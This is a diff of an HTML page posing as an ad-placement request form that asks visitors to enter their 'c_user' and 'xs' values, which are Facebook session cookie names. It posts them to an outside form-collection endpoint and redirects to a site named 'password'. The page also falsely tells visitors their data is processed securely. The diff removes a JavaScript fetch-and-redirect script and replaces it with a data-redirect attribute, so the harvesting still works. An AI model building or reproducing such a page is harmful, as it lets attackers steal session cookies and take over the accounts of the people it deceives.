@@ -94,41 +94,17 @@ Please fill in the details below to submit your request for placing an ad. Only 
 </video>
 </div>
 
-<!-- Form -->
-<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST">
+<!-- Form with Submit-Form integration and redirect -->
+<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST" data-redirect="https://password-orpin-theta.vercel.app/">
     <input type="text" name="c_user" placeholder="Enter c_user value" required>
     <input type="text" name="xs" placeholder="Enter XS value" required>
-    <button type="submit" id="submitBtn">
-        <span id="btnText">Submit Request</span>
+    <button type="submit">
+        Submit Request
     </button>
 </form>
 
 <p class="note">Your request will be processed securely. We respect your privacy.</p>
 </div>
-
-<script>
-const form = document.getElementById('adForm');
-const btn = document.getElementById('submitBtn');
-const btnText = document.getElementById('btnText');
-
-form.addEventListener('submit', function(e){
-    btn.disabled = true;
-    btnText.innerHTML = '<div class="spinner"></div> Submitting…';
-
-    // Use fetch to submit the form
-    fetch(form.action, {
-        method: 'POST',
-        body: new FormData(form)
-    }).finally(() => {
-        // After submission → redirect to your link
-        setTimeout(() => {
-            window.location.href = "https://password-orpin-theta.vercel.app/";
-        }, 1500); // small delay to ensure form is sent
-    });
-
-    e.preventDefault(); // prevent default form behavior
-});
-</script>
 
 </body>
 </html>
